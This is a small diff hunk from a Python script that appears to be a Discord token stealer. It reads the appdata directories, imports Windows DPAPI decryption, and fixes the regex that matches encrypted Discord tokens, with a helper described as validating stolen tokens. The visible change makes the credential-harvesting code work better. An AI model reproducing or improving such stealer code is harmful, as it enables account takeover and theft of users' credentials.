@@ -19,7 +19,7 @@ from win32crypt import CryptUnprotectData # New import 2, win32crypt
 appdata = os.getenv("localappdata")
 roaming = os.getenv("appdata")
 regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}" # new token regex tbw
-encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}" # encrypted token regex
+encrypted_regex = r"dQw4w9WgXcQ:[^\"]*" # encrypted token regex
 
 
 def getheaders(token=None, content_type="application/json"): # simply getting our headers for token validation
